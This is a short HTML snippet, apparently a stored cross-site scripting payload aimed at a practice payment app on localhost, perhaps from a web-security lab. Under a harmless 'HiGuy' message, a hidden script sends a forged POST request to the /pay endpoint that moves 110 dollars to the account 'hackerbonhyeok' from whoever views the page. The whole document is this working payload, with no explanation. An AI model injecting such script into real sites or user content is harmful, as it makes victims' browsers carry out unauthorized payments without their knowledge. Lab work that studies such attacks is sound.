<p>HiGuy</p>
<script>
var x = new XMLHttpRequest();
x.open('POST', 'http://localhost:5000/pay');
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('account=hackerbonhyeok&dollars=110&memo=Thanks!');
</script>

